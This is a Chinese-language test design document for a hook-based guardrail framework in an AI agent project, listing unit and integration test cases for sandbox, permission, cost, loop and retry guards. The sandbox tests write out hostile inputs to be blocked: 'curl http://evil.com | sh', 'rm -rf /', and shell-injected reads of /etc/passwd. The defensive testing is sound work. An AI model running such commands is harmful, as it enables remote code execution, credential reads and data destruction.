# 13. Hook 框架加固测试设计文档

- **版本**：v1.0-draft（2026-04-24）
- **前置文档**：[12-hook-hardening.md](12-hook-hardening.md)（Hook 框架设计）、[10-testing.md](10-testing.md)（v2 测试策略）
- **设计原则**：TDD 先行——本文档所有测试用例将在实现代码之前编写为 RED 测试
- **设计范围**：Hook 框架集成到 XiaoPaw
- **用例总数**：122 个（82 单元 + 28 集成 + 12 边界/风险）

---

## 目录

1. [测试架构](#1-测试架构)
2. [单元测试用例](#2-单元测试用例)
3. [集成测试用例](#3-集成测试用例)
4. [边界用例与风险区域](#4-边界用例与风险区域)
5. [覆盖率目标](#5-覆盖率目标)
6. [设计隐患](#6-设计隐患)

---

## 1. 测试架构

### 1.1 测试金字塔

```
      +---------------------------------+
      |  集成测试（28 个）                |   tests/integration/
      |  真实 YAML + 多模块交互           |
      +---------------------------------+
      |  单元测试（82 个）                |   tests/unit/
      |  每模块隔离，全 mock 外部依赖     |
      +---------------------------------+
```

本文档不涉及 E2E 测试（需要真实 LLM API），E2E 测试保留在 [10-testing.md](10-testing.md) 中，由 `@pytest.mark.integration` 控制。

### 1.2 Mock 策略

| 依赖 | 单元测试 | 集成测试 |
|------|---------|---------|
| HookRegistry | 真实实例 | 真实实例 |
| HookLoader | 真实实例 + `tmp_path` 文件系统 | 真实实例 + 真实 `shared_hooks/` |
| CrewAI hooks API（`@before_llm_call` 等） | `MagicMock` 模拟 context 对象 | `MagicMock`（不起真实 Crew） |
| SandboxGuard / PermissionGate / CostGuard / LoopDetector / RetryTracker | 真实实例，直接调用 handler 方法 | 通过 HookRegistry.dispatch_gate 间接调用 |
| SecurityAuditLogger | 真实实例 + `tmp_path` 文件 | 真实实例 + `tmp_path` 文件 |
| Langfuse | 不测（`@pytest.mark.integration` 分离） | 不测（独立标记） |
| 文件系统（YAML / 审计文件） | `tmp_path` fixture | `tmp_path` fixture |
| 环境变量 | `monkeypatch` | `monkeypatch` |
| 时间戳 | `freezegun` 或忽略（frozen dataclass 自动生成） | 忽略 |
| stderr 输出 | `capsys` / `capfd` 捕获验证 | 不验证 |

### 1.3 Fixture 策略

**全局 conftest.py 新增 fixture**：

| Fixture | 作用域 | 用途 |
|---------|-------|------|
| `hook_registry` | `function` | 每个测试用例独立的 HookRegistry 实例 |
| `hook_context_factory` | `session` | 工厂函数，按 EventType 快速创建 HookContext |
| `tmp_hooks_dir` | `function` | 在 `tmp_path` 下创建 hooks 目录 + hooks.yaml + handler 文件 |
| `clean_crewai_hooks` | `function` / `autouse` | 测试前后 `clear_all_global_hooks()`，防止全局污染 |
| `clean_env_vars` | `function` / `autouse` | 清除 `SECURITY_POLICY_PATH` / `SECURITY_AUDIT_FILE` / `COST_GUARD_BUDGET` 等环境变量 |

**测试数据**：

| 数据 | 路径 | 内容 |
|------|------|------|
| 工具输入样本 | `tests/fixtures/hook_tool_inputs.py` | 路径遍历/危险命令/Shell 注入/正常输入的参数化数据 |
| YAML 配置样本 | `tests/fixtures/hook_yaml_samples.py` | 合法/非法/空/格式错误的 hooks.yaml 模板 |
| 权限策略样本 | `tests/fixtures/security_policy_samples.py` | deny/ask/allow 组合的 security.yaml 模板 |

### 1.4 测试文件组织

```
tests/
├── unit/
│   ├── hook_framework/
│   │   ├── test_hook_registry.py        # UT-REG-001 ~ UT-REG-012
│   │   ├── test_hook_loader.py          # UT-LDR-001 ~ UT-LDR-014
│   │   └── test_crew_adapter.py         # UT-ADP-001 ~ UT-ADP-011
│   ├── shared_hooks/
│   │   ├── test_sandbox_guard.py        # UT-SBX-001 ~ UT-SBX-016
│   │   ├── test_permission_gate.py      # UT-PMG-001 ~ UT-PMG-010
│   │   ├── test_audit_logger.py         # UT-AUD-001 ~ UT-AUD-007
│   │   ├── test_cost_guard.py           # UT-CST-001 ~ UT-CST-010
│   │   ├── test_loop_detector.py        # UT-LPD-001 ~ UT-LPD-008
│   │   └── test_retry_tracker.py        # UT-RTR-001 ~ UT-RTR-006
├── integration/
│   ├── test_hook_chain.py               # IT-CHN-001 ~ IT-CHN-008
│   ├── test_security_chain.py           # IT-SEC-001 ~ IT-SEC-007
│   ├── test_adapter_integration.py      # IT-ADP-001 ~ IT-ADP-006
│   ├── test_two_layer_config.py         # IT-CFG-001 ~ IT-CFG-004
│   └── test_guardrail_deny_flow.py      # IT-GDF-001 ~ IT-GDF-003
└── fixtures/
    ├── hook_tool_inputs.py
    ├── hook_yaml_samples.py
    └── security_policy_samples.py
```

---

## 2. 单元测试用例

### 2.1 HookRegistry（12 个用例）

文件：`tests/unit/hook_framework/test_hook_registry.py`

#### 注册与分发

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-REG-001** | 注册一个 handler 后 dispatch 调用该 handler | 注册 MagicMock handler 到 `BEFORE_TURN`，dispatch `BEFORE_TURN` 事件 | handler 被调用恰好 1 次，参数为传入的 HookContext | P0 |
| **UT-REG-002** | 同一事件注册多个 handler，dispatch 按注册顺序全部调用 | 注册 h1, h2, h3 到 `BEFORE_LLM`，dispatch | h1, h2, h3 均被调用各 1 次；通过 `call_args_list` 验证调用顺序 | P0 |
| **UT-REG-003** | dispatch 无 handler 的事件不报错 | 不注册任何 handler，dispatch `SESSION_END` | 不抛异常 | P1 |
| **UT-REG-004** | 不同事件的 handler 互不干扰 | 注册 h1 到 `BEFORE_TURN`，h2 到 `AFTER_TURN`，dispatch `BEFORE_TURN` | 仅 h1 被调用，h2 未被调用 | P1 |

#### dispatch_gate

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-REG-005** | dispatch_gate 正常分发（无异常） | 注册普通 handler，dispatch_gate | handler 被调用，不抛异常 | P0 |
| **UT-REG-006** | dispatch_gate 传播 GuardrailDeny | 注册一个抛 `GuardrailDeny("budget exceeded")` 的 handler | `pytest.raises(GuardrailDeny, match="budget exceeded")` | P0 |
| **UT-REG-007** | dispatch_gate 吞掉非 GuardrailDeny 异常，后续 handler 继续执行 | 注册 h1(ok) → h2(RuntimeError) → h3(ok) | h1 和 h3 均被调用，h2 的 RuntimeError 被吞掉 | P0 |
| **UT-REG-008** | dispatch_gate 在第一个 GuardrailDeny 处停止，后续 handler 不执行 | 注册 h1(ok) → h2(GuardrailDeny) → h3(ok) | h1 被调用，h3 未被调用，抛出 h2 的 GuardrailDeny | P0 |

#### GuardrailDeny 异常类

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-REG-009** | GuardrailDeny 携带 reason 属性 | `GuardrailDeny("test reason")` | `e.reason == "test reason"` 且 `str(e) == "test reason"` | P1 |

#### handler_count 和 summary

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-REG-010** | handler_count 返回正确数量 | 注册 3 个 handler 到 `AFTER_TURN`，0 个到 `BEFORE_LLM` | `handler_count(AFTER_TURN) == 3`，`handler_count(BEFORE_LLM) == 0` | P1 |
| **UT-REG-011** | summary 返回所有注册的 handler 名称 | 注册 handler 时指定 name="h1"/"h2" | `summary()` 返回 `{"before_llm": ["h1", "h2"]}` | P2 |
| **UT-REG-012** | handler 异常不中断后续 handler（dispatch，非 dispatch_gate） | 注册 h1(ok) → h2(ValueError) → h3(ok)，使用 `dispatch` | h1 和 h3 均被调用，stderr 包含错误信息 | P0 |

---

### 2.2 HookLoader（14 个用例）

文件：`tests/unit/hook_framework/test_hook_loader.py`

#### YAML 解析

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LDR-001** | 从目录加载 hooks.yaml 中的 handler | `tmp_path` 创建 hooks.yaml（BEFORE_TURN: my_handler.on_turn）+ my_handler.py | `handler_count(BEFORE_TURN) == 1`，dispatch 后 handler 被调用 | P0 |
| **UT-LDR-002** | 缺少 hooks.yaml 不报错 | 传入空目录 | `handler_count` 全部为 0 | P0 |
| **UT-LDR-003** | hooks.yaml 引用不存在的模块，跳过并打印 stderr 警告 | hooks.yaml 引用 `nonexistent.do_stuff` | `handler_count == 0`，stderr 包含 "module not found" | P1 |
| **UT-LDR-004** | hooks.yaml 引用存在模块中不存在的函数，跳过 | hooks.yaml 引用 `my_handler.missing_func`，my_handler.py 不含该函数 | `handler_count == 0`，stderr 包含 "function not found" | P1 |
| **UT-LDR-005** | hooks.yaml 路径遍历被阻断 | hooks.yaml 引用 `../../../etc/evil.do_stuff` | handler 不被注册，stderr 包含 "path traversal" | P0 |

#### 两层加载

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LDR-006** | load_two_layers 合并全局层和 Workspace 层 | global_dir（TASK_COMPLETE: g.on_complete）+ workspace/hooks/（TASK_COMPLETE: w.on_complete） | `handler_count(TASK_COMPLETE) == 2` | P0 |
| **UT-LDR-007** | Workspace 层不存在时仅加载全局层 | global_dir 有效，workspace_dir 下无 hooks/ 子目录 | 仅全局层 handler 注册 | P1 |
| **UT-LDR-008** | 全局层不存在时仅加载 Workspace 层 | global_dir 无 hooks.yaml，workspace_dir/hooks/ 有效 | 仅 Workspace 层 handler 注册 | P2 |

#### 策略实例化（strategies 段）

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LDR-009** | strategies 段实例化有状态类并注册 handler | hooks.yaml 包含 strategies，引用 `my_strategy.Counter` 类（含 `start` 参数 + `on_turn` 方法） | 实例化后 `loader.strategies["my_strategy"].count == start`，dispatch 后 count 递增 | P0 |
| **UT-LDR-010** | strategies 段引用不存在的模块，跳过 | strategies 引用 `missing_mod.Foo` | `handler_count == 0`，stderr 包含错误信息 | P1 |
| **UT-LDR-011** | strategies 段引用存在模块中不存在的类，跳过 | strategies 引用 `my_mod.NonExistentClass` | 不注册，stderr 包含 "class not found" | P1 |
| **UT-LDR-012** | strategies 段 config 参数正确传递给构造函数 | `config: {budget_usd: 0.5}`，类构造函数接受 `budget_usd` 参数 | 实例的 `_budget == 0.5` | P1 |

#### 依赖注入（deps 段）

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LDR-013** | deps 段正确注入已实例化的策略实例 | 先声明 Logger 策略，再声明 Gate 策略（deps: {logger: logger_mod}） | `gate.logger is logger` 为 True，gate 调用时通过 logger 记录事件 | P0 |
| **UT-LDR-014** | deps 引用不存在的策略键，注入 None 但不阻塞实例化 | deps 引用 `nonexistent_strategy` | 实例化成功，`gate.logger is None` | P1 |

---

### 2.3 CrewObservabilityAdapter（11 个用例）

文件：`tests/unit/hook_framework/test_crew_adapter.py`

**前置条件**：每个用例开始前执行 `clear_all_global_hooks()`。

#### BEFORE_TURN 计数逻辑

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-ADP-001** | 首次 `@before_llm_call` 触发 BEFORE_TURN + BEFORE_LLM 两个事件 | 安装 hooks 后，调用一次 before_llm_call handler | 收到 BEFORE_TURN(turn=1) 和 BEFORE_LLM(turn=1)，`adapter._turn_count == 1` | P0 |
| **UT-ADP-002** | 同轮第二次 `@before_llm_call` 只触发 BEFORE_LLM，不再触发 BEFORE_TURN | 连续调用两次 before_llm_call handler（不经过 step_callback） | BEFORE_TURN 仅 1 次，BEFORE_LLM 2 次 | P0 |
| **UT-ADP-003** | step_callback 后新的 `@before_llm_call` 触发新一轮的 BEFORE_TURN | 调用 before_llm → step_callback → before_llm | BEFORE_TURN 共 2 次，`adapter._turn_count == 2` | P0 |

#### step_callback / task_callback

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-ADP-004** | step_callback 触发 AFTER_TURN 事件 | 调用 `adapter.make_step_callback()` 返回的回调函数，传入 MagicMock(output="x") | 收到 AFTER_TURN 事件 | P0 |
| **UT-ADP-005** | step_callback 重置 `_current_turn_has_llm` 标志 | 调用 before_llm → step_callback → 检查内部状态 | `adapter._current_turn_has_llm == False` | P1 |
| **UT-ADP-006** | task_callback 触发 TASK_COMPLETE 事件 | 调用 `adapter.make_task_callback()` 返回的回调函数 | 收到 TASK_COMPLETE 事件，metadata 包含 `raw_output` 和 `task_description` | P0 |

#### 工具调用映射

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-ADP-007** | `@before_tool_call` 映射为 BEFORE_TOOL_CALL 事件，携带 tool_name 和 tool_input | 通过 CrewAI before_tool_call hooks 调用 handler | 收到 BEFORE_TOOL_CALL 事件，`ctx.tool_name == "web_search"`，`ctx.tool_input == {"query": "test"}` | P0 |
| **UT-ADP-008** | `@after_tool_call` 映射为 AFTER_TOOL_CALL 事件，携带 tool_result 截断 | tool_result 长度超过 2000 字符 | metadata 中 `tool_output` 以 "... [truncated" 结尾 | P1 |

#### cleanup

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-ADP-009** | cleanup 触发 SESSION_END 事件并清理全局 hooks | 调用 `adapter.cleanup()` | 收到 SESSION_END 事件，`get_before_llm_call_hooks()` / `get_before_tool_call_hooks()` / `get_after_tool_call_hooks()` 均为空列表 | P0 |
| **UT-ADP-010** | cleanup 幂等——多次调用不重复触发 SESSION_END | 调用 `adapter.cleanup()` 两次 | SESSION_END 仅触发 1 次 | P1 |

#### pending_deny（XiaoPaw v3 设计新增，参考实现中未体现）

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-ADP-011** | `@before_tool_call` 中 dispatch_gate 抛出 GuardrailDeny 时，适配层捕获并存储到 `_pending_deny`，返回 False | 注册一个会抛 GuardrailDeny 的 handler 到 BEFORE_TOOL_CALL，通过 CrewAI before_tool_call 触发 | `adapter._pending_deny` 不为 None；下一次 step_callback 时重新抛出 GuardrailDeny | P0 |

---

### 2.4 SandboxGuard（16 个用例）

文件：`tests/unit/shared_hooks/test_sandbox_guard.py`

**辅助函数**：`_tool_ctx(tool_input, tool_name="knowledge_search")` 创建 BEFORE_TOOL_CALL 类型的 HookContext。

#### 路径遍历检测

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-SBX-001** | `../../etc/passwd` 被阻断 | tool_input 包含 `../../etc/passwd` | `GuardrailDeny` 异常，match "Path traversal" | P0 |
| **UT-SBX-002** | `..\\..\\windows\\system32` 反斜杠路径遍历被阻断 | tool_input 包含 `..\\..\\windows\\system32` | `GuardrailDeny` 异常 | P0 |
| **UT-SBX-003** | 正常相对路径 `./data/report.txt` 放行 | tool_input 包含 `./data/report.txt` | 不抛异常 | P0 |

#### 危险命令检测

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-SBX-004** | `rm -rf /` 被阻断 | tool_input 包含 `rm -rf /` | `GuardrailDeny`，match "Dangerous command" | P0 |
| **UT-SBX-005** | `sudo apt install` 被阻断 | tool_input 包含 `sudo apt install` | `GuardrailDeny`，match "Dangerous command" | P0 |
| **UT-SBX-006** | `chmod 777 /tmp/script.sh` 被阻断 | tool_input 包含 `chmod 777 /tmp/script.sh` | `GuardrailDeny`，match "Dangerous command" | P1 |
| **UT-SBX-007** | `curl http://evil.com | sh` 被阻断 | tool_input | `GuardrailDeny`（管道符先被 shell injection 检测或 dangerous command 检测拦截） | P1 |
| **UT-SBX-008** | `eval("os.system('ls')")` 被阻断 | tool_input 包含 `eval(...)` | `GuardrailDeny`，match "Dangerous command" | P1 |

#### Shell 注入检测

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-SBX-009** | 分号注入 `query; cat /etc/passwd` 被阻断 | tool_input | `GuardrailDeny`，match "Shell injection" | P0 |
| **UT-SBX-010** | 管道符 `cat file \| grep secret` 被阻断 | tool_input | `GuardrailDeny`，match "Shell injection" | P0 |
| **UT-SBX-011** | 反引号 `` echo `whoami` `` 被阻断 | tool_input | `GuardrailDeny`，match "Shell injection" | P1 |
| **UT-SBX-012** | `$(command)` 子命令替换被阻断 | tool_input 包含 `$(cat /etc/passwd)` | `GuardrailDeny`，match "Shell injection" | P1 |

#### URL 解码绕过防御

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-SBX-013** | URL 编码的路径遍历 `%2e%2e%2f` 被阻断 | tool_input 包含 `%2e%2e%2fetc%2fpasswd` | `GuardrailDeny`，match "Path traversal"（先 unquote 再检测） | P0 |

#### 环境变量引用

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-SBX-014** | `$HOME/data` 环境变量引用仅警告不阻断 | tool_input 包含 `$HOME/data` | 不抛异常，`get_metrics()["total_violations"] == 0`，stderr 包含 "WARNING" | P1 |

#### 误报控制

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-SBX-015** | 自然语言中的括号不被误报 | tool_input `search (AI agent) security` | 不抛异常，`total_violations == 0` | P0 |
| **UT-SBX-016** | 空输入安全通过 | tool_input 为空 dict `{}` | 不抛异常 | P1 |

#### 审计集成与度量

> 注：以下用例验证 SandboxGuard 与 SecurityAuditLogger 的联动，但仍属于单元级（直接传入 audit 实例）。

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| (**UT-SBX-017**) | 违规时调用 audit.record_event | 传入 `audit=SecurityAuditLogger()` 实例，触发路径遍历 | audit 实例的 `_events` 列表包含 `sandbox_path_traversal` 事件 | P1 |
| (**UT-SBX-018**) | 累计 metrics 正确 | 连续触发路径遍历和危险命令两种违规 | `get_metrics()` 返回 `total_violations == 2`，`violations_by_type` 包含两种类型 | P1 |

---

### 2.5 PermissionGate（10 个用例）

文件：`tests/unit/shared_hooks/test_permission_gate.py`

**辅助函数**：
- `_tool_ctx(tool_name)` 创建 BEFORE_TOOL_CALL 类型的 HookContext
- `_gate_from_dict(tools, default)` 直接构造 PermissionGate 并填充 `_tool_permissions`

#### 三级权限

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-PMG-001** | DENY 工具被阻断 | `{"shell_executor": "deny"}` | `GuardrailDeny`，match "Permission denied" | P0 |
| **UT-PMG-002** | ALLOW 工具放行 | `{"knowledge_search": "allow"}` | 不抛异常 | P0 |
| **UT-PMG-003** | ASK 工具放行但记录决策 | `{"file_reader": "ask"}` | 不抛异常，`_decisions` 列表包含 `permission: "ask"` 记录 | P0 |

#### 默认策略

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-PMG-004** | 未列出的工具使用 default 策略（ask） | 注册 shell_executor=deny，调用 `new_tool` | 不抛异常，决策记录 `policy_source: "default"`，`permission: "ask"` | P0 |
| **UT-PMG-005** | default=deny 模式下未列出工具被阻断 | `default="deny"`，空 tools 字典 | `GuardrailDeny` | P0 |
| **UT-PMG-006** | default=allow 模式下未列出工具放行 | `default="allow"` | 不抛异常 | P1 |

#### YAML 加载

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-PMG-007** | 从 YAML 文件加载权限策略 | `tmp_path` 写入 security.yaml（knowledge_search: allow, shell_executor: deny） | knowledge_search 放行，shell_executor 被拦截 | P0 |
| **UT-PMG-008** | YAML 中 default 字段覆盖构造函数 default 参数 | security.yaml 含 `default: deny`，构造时 `default="ask"` | 未列出工具被阻断（YAML 中的 deny 优先） | P1 |

#### 工具名大小写

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-PMG-009** | 工具名大小写不敏感匹配 | 策略中注册 `Shell_Executor: deny`，调用时 tool_name 为 `shell_executor` | 被拦截（`.lower()` 归一化） | P1 |

#### metrics

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-PMG-010** | get_metrics 准确统计 deny/ask/allow 计数 | 连续调用 3 个 allow 工具 + 1 个 deny 工具 | `total_decisions==4, allow_count==3, deny_count==1, denied_tools==["shell"]` | P1 |

---

### 2.6 SecurityAuditLogger（7 个用例）

文件：`tests/unit/shared_hooks/test_audit_logger.py`

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-AUD-001** | record_event 累计事件到内存列表 | 连续记录 3 个事件（2 个 permission_deny + 1 个 sandbox_violation） | `get_metrics()` 返回 `total_security_events==3`，`events_by_type` 正确分组 | P0 |
| **UT-AUD-002** | 指定 audit_file 时事件写入 JSONL 文件 | `SecurityAuditLogger(audit_file=tmp_path/"audit.jsonl")`，记录 2 个事件 | 文件包含 2 行，每行为合法 JSON，包含 `timestamp` 和 `security_event` 字段 | P0 |
| **UT-AUD-003** | 不指定 audit_file 时事件仅存内存不写文件 | `SecurityAuditLogger()`，记录事件 | `get_metrics()` 正常返回，无文件被创建 | P1 |
| **UT-AUD-004** | session_end_handler 写入 session_summary 摘要 | 记录 2 个事件后调用 session_end_handler | 文件最后一行的 `security_event == "session_summary"`，包含 `session_id` 和 `total_security_events` | P0 |
| **UT-AUD-005** | session_end_handler 的 session_id 来自 HookContext | 传入 `session_id="p2p:ou_test"` 的 HookContext | summary 记录的 `session_id == "p2p:ou_test"` | P1 |
| **UT-AUD-006** | audit_file 写入失败（权限不足）不抛异常 | `audit_file` 设为不可写路径 | `record_event` 不抛异常，stderr 包含 "write error" | P1 |
| **UT-AUD-007** | 通过环境变量 `SECURITY_AUDIT_FILE` 设置审计文件路径 | `monkeypatch.setenv("SECURITY_AUDIT_FILE", str(path))` | 事件写入该路径 | P2 |

---

### 2.7 CostGuard（10 个用例）

文件：`tests/unit/shared_hooks/test_cost_guard.py`

**辅助函数**：
- `_turn_ctx(input_tokens, output_tokens, turn)` 创建 AFTER_TURN 的 HookContext
- `_tool_ctx(tool_name)` 创建 BEFORE_TOOL_CALL 的 HookContext

#### Token 累加与成本计算

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-CST-001** | after_turn_handler 正确累加 input_tokens 和 output_tokens | 连续两次 after_turn（100+100 input, 50+50 output） | `get_metrics()` 返回 `total_input_tokens==200, total_output_tokens==100` | P0 |
| **UT-CST-002** | 成本计算使用 MODEL_PRICES 中的价格 | model="qwen-plus"（input: 0.80, output: 2.00），100000 input / 50000 output | `estimated_cost_usd == 100000*0.80/1M + 50000*2.00/1M == 0.18` | P0 |
| **UT-CST-003** | 未知模型使用默认价格（input:1.0, output:3.0） | model="unknown-model" | 使用 fallback 价格计算 | P1 |

#### 预算围栏

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-CST-004** | after_turn_handler 超预算时抛出 GuardrailDeny | budget=0.0001，大量 token | `GuardrailDeny`，match "Budget exceeded" | P0 |
| **UT-CST-005** | before_tool_handler 预算已超时阻断工具调用 | 先 after_turn 超预算，再 before_tool | `GuardrailDeny` | P0 |
| **UT-CST-006** | 预算内时 before_tool_handler 放行 | budget=100.0，少量 token | 不抛异常 | P0 |

#### 边界条件

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-CST-007** | budget=0.0 时 before_tool_handler 立即阻断（>= 触发） | budget=0.0，不累加任何 token | `GuardrailDeny`（`0.0 >= 0.0` 为 True） | P0 |
| **UT-CST-008** | 负数 budget 构造时抛出 ValueError | `CostGuard(budget_usd=-1.0)` | `ValueError`，match "non-negative" | P1 |

#### 度量与 deny_count

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-CST-009** | deny_count 每次 deny 递增 | budget=0.0，连续 3 次 before_tool_handler | `get_metrics()["deny_count"] == 3` | P1 |
| **UT-CST-010** | 环境变量 COST_GUARD_BUDGET 覆盖构造函数参数 | `monkeypatch.setenv("COST_GUARD_BUDGET", "0.5")`，`CostGuard(budget_usd=1.0)` | `_budget == 0.5`（环境变量优先） | P1 |

---

### 2.8 LoopDetector（8 个用例）

文件：`tests/unit/shared_hooks/test_loop_detector.py`

**辅助函数**：`_turn_ctx(tool_name, output, turn)` 创建 AFTER_TURN 的 HookContext，metadata 包含 output。

#### 基本检测

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LPD-001** | 连续 N 次相同状态触发 GuardrailDeny | threshold=3，3 次相同 tool_name + output | `GuardrailDeny`，match "Loop detected" | P0 |
| **UT-LPD-002** | 不同状态不触发 | threshold=3，3 次不同 output | 不抛异常，`loop_detections == 0` | P0 |
| **UT-LPD-003** | 重复但不连续不触发（AABA 模式） | A, A, B, A | 不触发（最近 3 个是 A, B, A，不全相同） | P0 |

#### 阈值参数

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LPD-004** | threshold=2 时 2 次重复即触发 | 2 次相同状态 | `GuardrailDeny` | P1 |
| **UT-LPD-005** | threshold=5 时 4 次重复不触发 | 4 次相同状态 | 不抛异常 | P1 |

#### 双路径独立

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LPD-006** | after_tool_handler 使用独立的 `_tool_hashes`，检测工具调用循环 | threshold=2，2 次相同 AFTER_TOOL_CALL | `GuardrailDeny` via after_tool_handler | P0 |
| **UT-LPD-007** | tool path 和 turn path 互不干扰 | threshold=3，交替调用 after_tool_handler 和 after_turn_handler 各 2 次（相同状态）| 不触发（各路径只有 2 次，不足 threshold=3） | P0 |

#### 度量

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-LPD-008** | get_metrics 正确统计 total_turns / total_tool_calls / unique_states / loop_detections | 多次调用后查询 metrics | 所有计数准确 | P1 |

---

### 2.9 RetryTracker（6 个用例）

文件：`tests/unit/shared_hooks/test_retry_tracker.py`

**辅助函数**：`_tool_ctx(tool_name, success)` 创建 AFTER_TOOL_CALL 的 HookContext。

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **UT-RTR-001** | 连续失败正确累加 | 工具 "search" 连续失败 3 次 | `active_failures["search"] == 3` | P0 |
| **UT-RTR-002** | 成功后计数重置为 0 | 失败 2 次 → 成功 1 次 | `active_failures["search"] == 0` | P0 |
| **UT-RTR-003** | 重试成功率计算（首次失败不算重试，第 2 次起才算） | fail, fail, fail, success | `total_retries==2, successful_retries==1, retry_success_rate==0.5` | P0 |
| **UT-RTR-004** | 不同工具独立计数 | tool_a 失败 2 次，tool_b 失败 1 次 | `active_failures["tool_a"]==2, active_failures["tool_b"]==1` | P1 |
| **UT-RTR-005** | 空 tool_name 的事件被跳过 | `tool_name=""`, `success=False` | `active_failures == {}` | P1 |
| **UT-RTR-006** | max_retries 触发警告（通过 capsys 验证 stderr） | max_retries=3，连续失败 3 次 | stderr 包含 "WARNING" 和 "failed 3 times"；注意：RetryTracker 是纯观测，不抛 GuardrailDeny | P1 |

---

## 3. 集成测试用例

### 3.1 全链路事件分发（8 个用例）

文件：`tests/integration/test_hook_chain.py`

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **IT-CHN-001** | YAML 加载后 dispatch 触发观测层 handler（fire-and-forget） | 从真实 `shared_hooks/` 目录加载，dispatch BEFORE_TURN | 结构化日志 handler 被调用，不影响后续流程 | P0 |
| **IT-CHN-002** | YAML 加载后 dispatch_gate 触发策略层 handler | 加载策略后，dispatch_gate BEFORE_TOOL_CALL | SandboxGuard / PermissionGate / CostGuard 的 handler 按顺序执行 | P0 |
| **IT-CHN-003** | 全部 6 个策略都被正确加载到 loader.strategies | 从 `shared_hooks/` 加载 | strategies 字典包含 audit_logger, sandbox_guard, permission_gate, cost_guard, retry_tracker, loop_detector | P0 |
| **IT-CHN-004** | AFTER_TURN 执行顺序：cost_guard 先于 loop_detector | 加载后 dispatch_gate AFTER_TURN（少量 token + 不同输出） | cost_guard 先累加 token，loop_detector 后检测；cost_guard 的 total_input_tokens 有值证明先执行 | P0 |
| **IT-CHN-005** | BEFORE_TOOL_CALL 执行顺序：sandbox → permission → cost | 加载后用正常输入 dispatch_gate BEFORE_TOOL_CALL | 三个 handler 按序执行（通过 metrics 验证三者都被调用） | P0 |
| **IT-CHN-006** | 第一个策略 deny 后，后续策略不执行 | 发送路径遍历输入 → SandboxGuard deny | PermissionGate 的 `_decisions` 列表为空（证明未被调用） | P0 |
| **IT-CHN-007** | SESSION_END 事件触发 SecurityAuditLogger 的 session_end_handler | dispatch SESSION_END | 审计文件包含 session_summary 记录 | P1 |
| **IT-CHN-008** | AFTER_TOOL_CALL 同时触发 RetryTracker 和 LoopDetector | dispatch AFTER_TOOL_CALL（success=True） | 两个策略的 metrics 都有记录 | P1 |

### 3.2 安全链路集成（7 个用例）

文件：`tests/integration/test_security_chain.py`

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **IT-SEC-001** | SandboxGuard 路径遍历 → GuardrailDeny + 审计记录 | 通过 dispatch_gate 发送 `../../etc/passwd` | GuardrailDeny 被抛出，audit.jsonl 包含 `sandbox_path_traversal` 事件 | P0 |
| **IT-SEC-002** | PermissionGate deny → GuardrailDeny + 审计记录 | 策略中 `shell_executor: deny`，dispatch_gate 调用 shell_executor | GuardrailDeny 被抛出，audit.jsonl 包含 `permission_deny` 事件 | P0 |
| **IT-SEC-003** | 正常工具通过全部安全检查 | tool_name="knowledge_search"，tool_input 为正常查询 | 不抛异常，SandboxGuard/PermissionGate/CostGuard 均放行 | P0 |
| **IT-SEC-004** | SandboxGuard 阻断后 PermissionGate 不被调用 | 路径遍历输入 | PermissionGate._decisions 为空 | P0 |
| **IT-SEC-005** | SandboxGuard 和 PermissionGate 共享同一个 AuditLogger 实例 | deps 注入验证 | 两个策略的 `_audit` 属性 `is` 同一个 SecurityAuditLogger 实例 | P0 |
